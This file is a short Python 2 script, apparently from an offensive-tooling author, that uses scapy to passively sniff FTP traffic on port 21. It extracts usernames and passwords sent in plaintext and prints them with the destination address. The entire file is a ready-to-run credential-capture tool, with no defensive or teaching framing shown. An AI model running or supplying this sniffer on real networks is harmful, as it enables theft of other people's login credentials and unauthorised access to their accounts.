# -*- coding: UTF-8 -*-
#author: k8gege
import os
import queue
from scapy.all import *
def ftpsniff(pkt):
    dest = pkt.getlayer(IP).dst
    raw = pkt.sprintf('%Raw.load%')
    user = re.findall('(?i)USER (.*)', raw)
    pwd = re.findall('(?i)PASS (.*)', raw)
    if user:
        print '[*] FTP Login to ' + str(dest)
        print '[+] Username: ' + str(user[0]).replace("\\r\\n'","");
    elif pwd:
        print '[+] Password: ' + str(pwd[0]).replace("\\r\\n'","");

print('FTP Sniffing...');
sniff(filter="tcp port 21", prn=ftpsniff)
